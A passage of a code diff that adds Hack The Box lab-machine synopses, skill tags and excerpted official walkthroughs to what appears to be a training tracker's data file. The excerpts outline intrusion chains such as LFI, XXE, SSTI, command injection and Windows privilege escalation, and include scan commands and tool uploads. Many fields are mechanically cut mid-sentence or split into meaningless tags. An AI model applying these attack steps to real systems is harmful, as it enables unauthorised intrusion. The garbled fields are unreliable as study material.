+    "officialPdf": "360-Pikaboo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPikaboo is a Hard Linux machine where only FTP, SSH, and Web services are exposed. The website is hosting on Apache a pokatmon collection page. Common misconfigurations in the NGINX proxy server allow performing a path traversal attack. Exploiting this, it is possible to get access in the administration panel where a vulnerable to LFI page gives the opportunity to perform FTP Log poisoning and gain a foothold to the system. Performing basic\n\n### 🎯 Core Skills\n- **\"Off**\n- **slash\" vulnerability**\n- **Perl function injection**\n- **Local File Inclusion**\n\n### ⚔️ Foothold Vector\nto the system. Performing basic enumeration it is possible to locate a cron job where a Perl script with\n\n### 👑 Privilege Escalation\nprivileges is running periodically. By further enumerating the system it is also possible to get valid LDAP credentials. Using them to enumerate local LDAP service reveals the credentials for user pwnmeow. These can be used to log in to the FTP server where it is possible to create and upload malicious files that can exploit a Perl function vulnerability in the script in order to execute code and get a reverse shell as root. Skills Required Perl Linux Enumeration Source Code Review Skills Learned \"Off-by-slash\" vulnerability Perl function injection Local File Inclusion Enumeration Nmap The nmap scan shows that vsftpd, OpenSSH and nginx are listening on their default ports."
   },
   {
     "id": "htb-bountyhunter",
@@ -6886,15 +7670,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Source-code-review",
+      "XXE-injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bountyhunter",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bountyhunter",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-07-24T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell.",
+    "skillsLearned": [
+      "XXE injection",
+      "Source code review"
+    ],
+    "officialPdf": "359-BountyHunter_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell.\n\n### 🎯 Core Skills\n- **XXE injection**\n- **Source code review**\n\n### ⚔️ Foothold Vector\non system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as\n\n### 👑 Privilege Escalation\nwith sudo by the development user it is possible to get a root shell. Skills Required Python Basic Linux Skills Learned XXE injection Source code review Enumeration Nmap detects two open ports: SSH on port 22 and Apache2 on port 80 by default. We start by browsing at port 80. There is a bug bounty hunting team's webpage. The website contains useful information such as a name (John) and the announcement of a Bug Bounty Tracking System that is going to be available shortly. They have a Contact us form that doesn't work, so we fire up dirsearch and take a closer look at this site as we manually explore it. ports=$(nmap -p- --min-rate=1000 -T4 10.129.198."
   },
   {
     "id": "htb-seal",
@@ -6905,15 +7698,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Gitbucket",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/seal",
     "writeupUrl": "https://0xdf.gitlab.io/tags#seal",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Seal is a medium difficulty Linux machine that features an admin dashboard protected by mutual authentication.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-07-10T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Seal is a medium difficulty Linux machine that features an admin dashboard protected by mutual authentication.",
+    "skillsLearned": [
+      "Gitbucket"
+    ],
+    "officialPdf": "358-Seal_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSeal is a medium difficulty Linux machine that features an admin dashboard protected by mutual authentication.\n\n### 🎯 Core Skills\n- **Gitbucket**\n\n### ⚔️ Foothold Vector\nof Nginx path normalization leads to mutual authentication bypass which allows tomcat manager access. Foothold is obtained by deploying a shell on tomcat manager. An ansible playbook found to be running at intervals and vulnerable to arbitrary file read thus allows us moving laterally.\n\n### 👑 Privilege Escalation\nshell is gained by exploiting a sudo entry. Skills Required Linux Enumeration Understanding of Mutual Authentication OWASP Top 10 Basic Knowledge of Ansible Skills Learned Gitbucket Enumeration Nginx Path Normalization Exploitation Mutual Authentication Bypass Abusing Ansible Features Enumeration Nmap Nmap scan reveals there are 3 ports open. Let's browse to port 443. Nginx ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.250 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.10.10.250 We see an e-commerce application running on Nginx server. Its all static content. Let's fuzz the server for files and directories. FFUF ffuf -u https://10.10.10."
   },
   {
     "id": "htb-explore",
@@ -6924,15 +7724,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Basic-Android",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/explore",
     "writeupUrl": "https://0xdf.gitlab.io/tags#explore",
-    "hint": "Hack The Box Android machine. Rated Easy difficulty.",
+    "hint": "Explore is an easy difficulty Android machine. Network",
     "timeSpentSeconds": 0,
     "createdAt": "2021-06-26T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Explore is an easy difficulty Android machine. Network",
+    "skillsLearned": [
+      "Basic Android"
+    ],
+    "officialPdf": "356-Explore_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nExplore is an easy difficulty Android machine. Network\n\n### 🎯 Core Skills\n- **Basic Android**\n\n### ⚔️ Foothold Vector\nEnumeration Nmap Nmap reveals an SSH server running on port 2222, an HTTP service running on port 59777, and a filtered TCP service running on port 5555. Searching online for port 5555 , we get the following as the first result. This website shows known port assignments and vulnerabilities. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.247 In the above snippet we can see that the port 5555 is being used by the Android Debug Bridge (ADB). Android Debug Bridge (adb) is a command-line tool that allows users to communicate with an Android device.\n\n### 👑 Privilege Escalation\nuser. Skills required Basic Network/Android Enumeration Basic Metasploit Usage Skills learned Basic Android Exploitation Enumeration Nmap Nmap reveals an SSH server running on port 2222, an HTTP service running on port 59777, and a filtered TCP service running on port 5555. Searching online for port 5555 , we get the following as the first result. This website shows known port assignments and vulnerabilities. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.247 In the above snippet we can see that the port 5555 is being used by the Android Debug Bridge (ADB)."
   },
   {
     "id": "htb-static",
@@ -6943,15 +7750,32 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "DEBUG",
+      "Exploiting-phuip",
+      "HTB",
+      "Multiple-Server-Pivoting",
+      "PHP-X",
+      "fpizdam"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/static",
     "writeupUrl": "https://0xdf.gitlab.io/tags#static",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Static is a hard difficulty machine that features a web server running on port 8080. The website features a login page that can be easily bypassed by using default credentials, however, further access to the administrative panel is obstructed by a 2FA prompt.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-06-19T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Static is a hard difficulty machine that features a web server running on port 8080. The website features a login page that can be easily bypassed by using default credentials, however, further access to the administrative panel is obstructed by a 2FA prompt. A corrupt Gzip archive is also identified on the website and after downloading it, its contents can be recovered. The archive holds a database backup that contains the OTP code for the administrative user. Once the OTP code is identified, further",
+    "skillsLearned": [
+      "Decompression Troubleshooting",
+      "Multiple Server Pivoting",
+      "Configuring Routes for VPNs",
+      "Exploiting phuip",
+      "fpizdam",
+      "PHP X",
+      "DEBUG"
+    ],
+    "officialPdf": "355-Static_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nStatic is a hard difficulty machine that features a web server running on port 8080. The website features a login page that can be easily bypassed by using default credentials, however, further access to the administrative panel is obstructed by a 2FA prompt. A corrupt Gzip archive is also identified on the website and after downloading it, its contents can be recovered. The archive holds a database backup that contains the OTP code for the administrative user. Once the OTP code is identified, further\n\n### 🎯 Core Skills\n- **Decompression Troubleshooting**\n- **Multiple Server Pivoting**\n- **Configuring Routes for VPNs**\n- **Exploiting phuip**\n- **fpizdam**\n- **PHP X**\n- **DEBUG**\n\n### ⚔️ Foothold Vector\nof which leads to a shell on the pki system.\n\n### 👑 Privilege Escalation\ncan be achieved by exploiting a Format String vulnerability in the binary that is responsible for the VPN file generation. Skills Required Enumeration Web Exploitation TOTP Generation Pivoting Skills VPN Usage & Alteration Skills Basic Binary Exploitation Skills Skills Learned Decompression Troubleshooting Multiple Server Pivoting Configuring Routes for VPNs Exploiting phuip-fpizdam PHP X-DEBUG Exploitation Format String Attack Exploitation Enumeration Nmap nmap -sC -sV -Pn -v 10.10.10.246 -p- The Nmap scan reveals ports 22 (SSH), 2222 (SSH) and 8080 (Apache Server) to be open. Let's start with port 8080. curl -v 10.10.10."
   },
   {
     "id": "htb-dynstr",
@@ -6962,15 +7786,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Command-Injection",
+      "Dynamic-DNS",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/dynstr",
     "writeupUrl": "https://0xdf.gitlab.io/tags#dynstr",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Dynstr is a medium difficulty Linux machine featuring a blog providing Dynamic DNS services. The application API is vulnerable to command injection using which a foothold can be gained.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-06-12T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Dynstr is a medium difficulty Linux machine featuring a blog providing Dynamic DNS services. The application API is vulnerable to command injection using which a foothold can be gained. Enumerating one of the users folders leaks SSH private key. Updating DNS zone records allows SSH access which helps in lateral movement. By exploiting a wildcard injection in a bash script root access can be obtained.",
+    "skillsLearned": [
+      "Command Injection",
+      "Dynamic DNS"
+    ],
+    "officialPdf": "352-dynstr_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDynstr is a medium difficulty Linux machine featuring a blog providing Dynamic DNS services. The application API is vulnerable to command injection using which a foothold can be gained. Enumerating one of the users folders leaks SSH private key. Updating DNS zone records allows SSH access which helps in lateral movement. By exploiting a wildcard injection in a bash script root access can be obtained.\n\n### 🎯 Core Skills\n- **Command Injection**\n- **Dynamic DNS**\n\n### ⚔️ Foothold Vector\ncan be gained. Enumerating one of the users folders leaks SSH private key. Updating DNS zone records allows SSH access which helps in lateral movement. By exploiting a wildcard injection in a bash script\n\n### 👑 Privilege Escalation\naccess can be obtained. Skills Required Enumeration Basic Knowledge of Linux OWASP Top 10 Skills Learned Command Injection Dynamic DNS Exploitation cp Wildcard Injection Enumeration Nmap scan reveals that the target server has 22 (OpenSSH), 53 (ISC BIND) and 80 (Apache httpd) open. Apache Let's browse to port 80. ports=$(nmap -p- --min-rate=1000 -T4 10.129.233.48 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.129.233.48 The blog highlights about DYNA DNS which is a dynamic DNS service. Services section of the page reveals that this service uses the same API as no-ip.com service. It also provides credentials. Referring the noip."
   },
   {
     "id": "htb-cap",
@@ -6981,12 +7814,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "HTB",
+      "IDOR"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/cap",
     "writeupUrl": "https://0xdf.gitlab.io/tags#cap",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Cap is an easy difficulty Linux machine running an HTTP server thus allowing users to capture the non- enrypted traffic. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture.",
     "timeSpentSeconds": 3600,
     "createdAt": "2021-06-05T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -6995,7 +7829,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Cap is an easy difficulty Linux machine running an HTTP server thus allowing users to capture the non- enrypted traffic. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to get root.",
+    "skillsLearned": [
+      "IDOR",
+      "Exploiting Linux capabilities"
+    ],
+    "officialPdf": "351-Cap_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCap is an easy difficulty Linux machine running an HTTP server thus allowing users to capture the non- enrypted traffic. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to get root.\n\n### 🎯 Core Skills\n- **IDOR**\n- **Exploiting Linux capabilities**\n\n### ⚔️ Foothold Vector\n. A Linux capability is then leveraged to get\n\n### 👑 Privilege Escalation\n. Skills Required Web enumeration Packet capture analysis Skills learned IDOR Exploiting Linux capabilities Enumeration Nmap Nmap reveals three open ports running FTP (21), SSH (22) and an HTTP server on port 80. FTP Let's check if FTP allows anonymous access. The login fails, which means that the anonymous access is disabled. Let's move on to the HTTP server. HTTP ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -Pn -sC -sV 10.10.10.245 According to nmap, port 80 is running Gunicorn, which is a python based HTTP server. Browsing to the page reveals a dashboard."
   },
   {
     "id": "htb-spider",
@@ -7006,15 +7847,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Bypassing-WAF-filters.",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/spider",
     "writeupUrl": "https://0xdf.gitlab.io/tags#spider",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Spider is a hard difficulty Linux machine which focuses on web-based injection attacks. Server-Side Template Injection (SSTI) is first exploited to read the config object of a Flask application and obtain the SECRET_KEY string, which can be used to sign and verify session cookies",
     "timeSpentSeconds": 0,
     "createdAt": "2021-05-29T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Spider is a hard difficulty Linux machine which focuses on web-based injection attacks. Server-Side Template Injection (SSTI) is first exploited to read the config object of a Flask application and obtain the SECRET_KEY string, which can be used to sign and verify session cookies. An SQL injection attack carried through forged cookies allows attackers to retrieve login data from the database and gain administrative access to the web application. A second SSTI vulnerability is found in a support ticket portal.",
+    "skillsLearned": [
+      "Obtaining the application configuration via SSTI.",
+      "Decoding and forging Flask cookies.",
+      "SQL injection attacks via session cookies;",
+      "Bypassing WAF filters."
+    ],
+    "officialPdf": "350-Spider_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSpider is a hard difficulty Linux machine which focuses on web-based injection attacks. Server-Side Template Injection (SSTI) is first exploited to read the config object of a Flask application and obtain the SECRET_KEY string, which can be used to sign and verify session cookies. An SQL injection attack carried through forged cookies allows attackers to retrieve login data from the database and gain administrative access to the web application. A second SSTI vulnerability is found in a support ticket portal.\n\n### 🎯 Core Skills\n- **Obtaining the application configuration via SSTI.**\n- **Decoding and forging Flask cookies.**\n- **SQL injection attacks via session cookies;**\n- **Bypassing WAF filters.**\n\n### ⚔️ Foothold Vector\nWhen registering a new user, we are immediately redirected to the login page. The Username field is automatically populated with our new UUID. We enter our password and submit the form. After logging in, a new link called USER INFORMATION is shown: This takes us to the /user page, where our username and UUID are displayed. Seeing that our username is reflected back to us, we test for Server-Side Template Injection by registering a new account with the username {{7*7}} . After logging in, we visit the /user page again to confirm that our payload worked: the expression was evaluated and the result ( 49 ) is shown.\n\n### 👑 Privilege Escalation\n': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime."
   },
   {
     "id": "htb-knife",
@@ -7030,7 +7881,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/knife",
     "writeupUrl": "https://0xdf.gitlab.io/tags#knife",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server.",
     "timeSpentSeconds": 3600,
     "createdAt": "2021-05-22T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -7039,7 +7890,10 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.",
+    "officialPdf": "347-Knife_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nKnife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.\n\n### ⚔️ Foothold Vector\non the server. A sudo misconfiguration is then exploited to gain a\n\n### 👑 Privilege Escalation\nshell. Skills Required Enumeration Basic Knowledge of Linux OWASP Top 10 Skills Learned Web Exploitation Knife Sudo Exploitation Enumeration Nmap scan reveals that the target server has two ports open. Apache2 Let's browse to port 80. Apache is hosting an Emergent Medical Idea application. There's nothing interesting in this application. FFUF Let's enumerate files and folders using ffuf utility. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.10.10.242 Nothing interesting from the results. We send a cURL request to index.php page and observe the response headers."
   },
   {
     "id": "htb-pit",
@@ -7050,15 +7904,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "12744",
+      "2019",
+      "CVE-2019-12744",
+      "Exploiting-CVE",
+      "HTB",
+      "SNMP-extensions"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/pit",
     "writeupUrl": "https://0xdf.gitlab.io/tags#pit",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Pit is a medium difficulty Linux machine that focuses on SNMP",
     "timeSpentSeconds": 0,
     "createdAt": "2021-05-15T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Pit is a medium difficulty Linux machine that focuses on SNMP",
+    "skillsLearned": [
+      "SNMP extensions",
+      "Exploiting CVE",
+      "2019",
+      "12744",
+      "Basic awareness about possible SELinux restrictions"
+    ],
+    "officialPdf": "346-Pit_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPit is a medium difficulty Linux machine that focuses on SNMP\n\n### 🎯 Core Skills\n- **SNMP extensions**\n- **Exploiting CVE**\n- **2019**\n- **12744**\n- **Basic awareness about possible SELinux restrictions**\n\n### 🛡️ Associated CVEs\n`CVE-2019-12744`\n\n### ⚔️ Foothold Vector\n, while introducing basic SELinux restrictions and web misconfigurations. By enumerating SNMP via the default insecure public community, information about filesystems and users can be obtained. This allows attackers to discover and gain access to a vulnerable SeedDMS instance, which was incorrectly patched by applying Apache .htaccess rules to an Nginx server where they are not effective. Exploiting CVE-2019- 12744 results in Remote Command Execution (with some SELinux restrictions) and subsequent access to a Cockpit console via password reuse. Privileges are escalated by writing a Bash script that is executed as an SNMP extension when the corresponding OID is queried.\n\n### 👑 Privilege Escalation\n. Querying SNMP for standard OIDs (filesystems, network settings, etc.) does not provide us with any useful information, so we further enumerate potential custom extensions by querying the corresponding OID: snmpwalk -cpublic -v2c 10.10.10.241 .1.3.6.1.4.1.8072.1.3.2 An extend command named monitoring is defined, which runs the /usr/bin/monitor script. From the returned output we can gather some interesting information. Specifically, a user called michelle is defined on the system, which is a confined user_u SELinux user (we can see from the table of SELinux user capabilities that, for example, this user won't be able to run the su and sudo commands)."
   },
   {
     "id": "htb-pivotapi",
@@ -7069,15 +7938,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Metadata"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/pivotapi",
     "writeupUrl": "https://0xdf.gitlab.io/tags#pivotapi",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Pivotapi is an insane machine that involves user",
     "timeSpentSeconds": 0,
     "createdAt": "2021-05-08T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Pivotapi is an insane machine that involves user",
+    "skillsLearned": [
+      "Metadata"
+    ],
+    "officialPdf": "345-pivotapi_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPivotapi is an insane machine that involves user\n\n### 🎯 Core Skills\n- **Metadata**\n\n### ⚔️ Foothold Vector\nwas achieved and now it is possible to read the user flag.\n\n### 👑 Privilege Escalation\nTo begin enumeration we upload SharpHound.exe via scp to the target. Once we execute SharpHound.exe we observe that a zip file is created. We import it into BloodHound . We get the dump on our localhost and now we can import it into bloodhound and inspect the current GPOs of the users. After enumerating some of them, we discover that 3v4Si0N has generic all over Dr. Zaiuss . With this knowledge we have full control over Dr.Zaiuss user, so we can upload PowerView.ps1 and after bypassing ASMI we can reset Dr.Zaiuss's password. Then it is possible to change the user's password by issuing the following commands. scp ./SharpHound.exe 3v4Si0N@10.10.10.240:/temp scp PowerView.ps1 3v4si0n@10.10.10."
   },
   {
     "id": "htb-love",
@@ -7088,15 +7964,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Applocker-policies",
+      "Exploit-modification",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/love",
     "writeupUrl": "https://0xdf.gitlab.io/tags#love",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Love is an easy windows machine where it features a voting system application that suffers from an authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000 where browsing the page we discover that we are not allowed to access the res",
     "timeSpentSeconds": 0,
     "createdAt": "2021-05-01T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Love is an easy windows machine where it features a voting system application that suffers from an authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000 where browsing the page we discover that we are not allowed to access the resource. Furthermore a file scanner application is running on the same server which is though effected by a SSRF vulnerability where it's exploitation gives access to an internal password manager.",
+    "skillsLearned": [
+      "Exploit modification",
+      "Server side request forgery",
+      "Applocker policies",
+      "Always install everything misconfiguration"
+    ],
+    "officialPdf": "344-Love_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLove is an easy windows machine where it features a voting system application that suffers from an authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000 where browsing the page we discover that we are not allowed to access the resource. Furthermore a file scanner application is running on the same server which is though effected by a SSRF vulnerability where it's exploitation gives access to an internal password manager.\n\n### 🎯 Core Skills\n- **Exploit modification**\n- **Server side request forgery**\n- **Applocker policies**\n- **Always install everything misconfiguration**\n\n### ⚔️ Foothold Vector\ngives access to an internal password manager. We can then gather credentials for the voting system and by executing the remote code execution attack as phoebe user we get the initial foothold on system. Basic windows enumeration reveals that the machine suffers from an elevated misconfiguration. Bypassing the applocker restriction we manage to install a malicious msi file that finally results in a reverse shell as the system account.\n\n### 👑 Privilege Escalation\nBy enumerating common windows registry keys, we find AlwaysInstallElevated is set to be enabled. We can exploit this vulnerability and execute our Windows Installer (.msi) payload. However, if we try to run the payload it will prove to be unsuccessful. Upon further enumeration, we observe that the applocker policy is set and only Phoebe and Administrator users are allowed to install MSI files in a specific directory. $ python3 49445.py Start a NC listner on the port you choose above and run..."
   },
   {
     "id": "htb-monitors",
@@ -7107,15 +7994,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2020-9496",
+      "Exploit-modification",
+      "HTB",
+      "Java-Deserialization",
+      "Local-File-Inclusion"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/monitors",
     "writeupUrl": "https://0xdf.gitlab.io/tags#monitors",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Monitors is a hard Linux machine that involves WordPress plugin exploitation leading to a command injection via SQL injection through a well known network management web application in order to get a shell on the system. Then by performing basic service file",
     "timeSpentSeconds": 0,
     "createdAt": "2021-04-24T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Monitors is a hard Linux machine that involves WordPress plugin exploitation leading to a command injection via SQL injection through a well known network management web application in order to get a shell on the system. Then by performing basic service file",
+    "skillsLearned": [
+      "Local File Inclusion",
+      "Abusing MySQL Misconfigurations",
+      "Exploit modification",
+      "Java Deserialization",
+      "CAP_SYS_MODULE Docker Capability"
+    ],
+    "officialPdf": "341-Monitors_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMonitors is a hard Linux machine that involves WordPress plugin exploitation leading to a command injection via SQL injection through a well known network management web application in order to get a shell on the system. Then by performing basic service file\n\n### 🎯 Core Skills\n- **Local File Inclusion**\n- **Abusing MySQL Misconfigurations**\n- **Exploit modification**\n- **Java Deserialization**\n- **CAP_SYS_MODULE Docker Capability**\n\n### 🛡️ Associated CVEs\n`CVE-2020-9496`\n\n### ⚔️ Foothold Vector\nleading to a command injection via SQL injection through a well known network management web application in order to get a shell on the system. Then by performing basic service file enumeration one can gain the user password and thus a foothold to the system through SSH. The\n\n### 👑 Privilege Escalation\nstage consists of a Java based XML RPC deserialization attack against Apache OFBiz to gain a shell in a Docker container. Then it is possible by abusing the CAP_SYS_MODULE capability to load a malicious kernel module against the host and escalate privileges to root. Skills Required Linux Enumeration Web Enumeration Docker Enumeration Troubleshooting Skills Learned Local File Inclusion Abusing MySQL Misconfigurations Exploit modification Java Deserialization CAP_SYS_MODULE Docker Capability Enumeration Nmap Nmap reveals that OpenSSH and Apache are listening on their default ports. Apache Browsing to port 80, a message is displayed that direct IP access is not allowed."
   },
   {
     "id": "htb-atom",
@@ -7131,10 +8032,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/atom",
     "writeupUrl": "https://0xdf.gitlab.io/tags#atom",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Atom is a Medium Windows machine that features a hosting of Electron software. The website hosts a windows version of the application (Electron Builder) where a vulnerability in signature validation can lead to remote command execution and thus get a foothold on system as user ja",
     "timeSpentSeconds": 0,
     "createdAt": "2021-04-17T16:00:00.000000Z",
